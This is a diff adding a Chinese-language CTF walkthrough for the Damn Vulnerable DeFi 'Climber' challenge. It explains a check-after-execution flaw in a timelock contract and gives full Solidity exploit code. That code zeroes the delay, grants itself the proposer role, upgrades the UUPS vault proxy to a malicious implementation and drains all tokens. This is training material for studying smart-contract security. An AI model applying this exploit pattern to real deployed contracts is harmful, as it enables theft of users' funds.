@@ -846,4 +846,131 @@ contract Backdoor is Test {
 ```
 forge test --match-contract Backdoor -vvvv
 ```
+# #12 - Climber
+
+合约:
+
+- [ClimberVault.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/climber/ClimberVault.sol) 保险库合约
+- [ClimberTimelock.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/climber/ClimberTimelock.sol) 时间锁合约
+
+题目要求:
+
+有一个安全的保险库合约保护着 1000 万个 DVT 代币,保管库是可升级的,遵循 UUPS 代理模式
+
+金库的所有者,目前是一个时间锁合约,每 15 天可以提取非常有限数量的 DVT 代币.
+
+在金库上还有一个额的角色,它有权在紧急情况下提取所有代币.
+
+时间锁合约里，只有具有"proposer"角色的帐户才能安排可在 1 小时后执行的操作.
+
+目标是清空保险库合约的 DVT 代币.
+
+解决方案:
+
+问题在于 `ClimberTimelock` 合约 **execute()** 函数没有严格遵守 solidity checks-effects-interaction 编码模式,没有在执行某个功能的功能之前检查所有先决条件.这里对我们执行操作状态在执行操作完成之后才进行检查,而我们在执行中可以执行我们的恶意操作,并使最后的状态检查通过.
+
+```solidity
+function execute(
+        address[] calldata targets,
+        uint256[] calldata values,
+        bytes[] calldata dataElements,
+        bytes32 salt
+    ) external payable {
+        require(targets.length > 0, "Must provide at least one target");
+        require(targets.length == values.length);
+        require(targets.length == dataElements.length);
+
+        bytes32 id = getOperationId(targets, values, dataElements, salt);
+
+        for (uint8 i = 0; i < targets.length; i++) {
+            targets[i].functionCallWithValue(dataElements[i], values[i]);
+        }
+
+        require(getOperationState(id) == OperationState.ReadyForExecution);
+        operations[id].executed = true;
+    }
+
+```
+
+开始构造我们的传入恶意操作数组 **execute()** 让 `ClimberTimelock` 合约去调用, `ClimberVault` 合约遵循 UUPS 代理模式,而 `ClimberTimelock` 合约为 `ClimberVault`  合约的 owner 角色,可以升级 proxy 合约到新的实现合约,所以可以替换成我们编写的恶意UUPS 实现合约,合约里编写一个函数 transfer 完 proxy 合约里的所有代币.更新成新实现合约后,proxy 合约委托调用即可.最后为了保证 `execute()` 能通过执行后才做的条件检查,首先执行操作中调用 updateDelay() 函数将 delay 执行延迟设置为 0,将我们的 attack 合约授予 proposer 角色,这样就可以通过 `schedule()` 函数将包含我们所有操作的数组 id 状态设置为 ReadyForExecution,使最后的 **getOperationState(id) == OperationState.ReadyForExecution** 检查通过,完成挑战.
+
+```solidity
+    function getOperationState(bytes32 id) public view returns (OperationState) { 
+        Operation memory op = operations[id];
+        
+        if(op.executed) {
+            return OperationState.Executed;
+        } else if(op.readyAtTimestamp >= block.timestamp) {
+            return OperationState.ReadyForExecution;
+        } else if(op.readyAtTimestamp > 0) {
+            return OperationState.Scheduled;
+        } else {
+            return OperationState.Unknown;
+        }
+    }
+```
+
+使用 foundry 编写测试:
+
+[Climber.t.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/test/Climber.t.sol) 
+
+```solidity
+contract Payload {
+    address[] public targets;
+    uint256[] public values;
+    bytes[] public dataElements;
+    bytes32 public salt = 0x0;
+    ClimberTimelock climbertimelock;
+    ERC1967Proxy internal climberVaultProxy;
+    ClimberVault internal climberimpl;
+    DamnValuableToken dvt;
+    address public attacker;
+
+    constructor(ClimberTimelock _climbertimelock,
+                ERC1967Proxy _climberVaultProxy,
+                ClimberVault _climberimpl, 
+                DamnValuableToken _dvt
+    ) {
+        climbertimelock = _climbertimelock;
+        climberVaultProxy = _climberVaultProxy;
+        climberimpl = _climberimpl;
+        attacker = msg.sender;
+        dvt = _dvt;
+    }
+
+    function Start() public {
+        bytes memory updateDelay_func_sign = abi.encodeWithSelector(climbertimelock.updateDelay.selector, 0);
+        bytes memory  grantRole_func_sign = abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this));
+        bytes memory transferOwnership_func_sign = abi.encodeWithSignature("transferOwnership(address)", address(this));
+        bytes memory schedule_func_sign = abi.encodeWithSelector(this.schedule.selector);
+        bytes memory upgradeTo_func_sign = abi.encodeWithSignature("upgradeTo(address)", address(new newImpl()));
+        bytes memory attack_func_sign = abi.encodeWithSignature("attack(address)", address(dvt));
+        targets = [address(climbertimelock), address(climbertimelock), address(climberVaultProxy), address(this)];
+        values = [0, 0, 0, 0];
+        dataElements = [updateDelay_func_sign, grantRole_func_sign, transferOwnership_func_sign, schedule_func_sign];
+        
+
+        climbertimelock.execute(targets, values, dataElements, salt);
+        address(climberVaultProxy).call(upgradeTo_func_sign);
+        address(climberVaultProxy).call(attack_func_sign);
+
+    }
+
+    function schedule() public{
+        climbertimelock.schedule(targets, values, dataElements, salt);
+    }
+}    
+
+contract newImpl is UUPSUpgradeable {
+    function attack(address _dvt) public {
+        IERC20(_dvt).transfer(tx.origin, 10_000_000e18);
+    }
+
+    function _authorizeUpgrade(address newImplementation) internal override {}
+}
+```
+
+```
+forge test --match-contract Climber -vvvv
+```
 
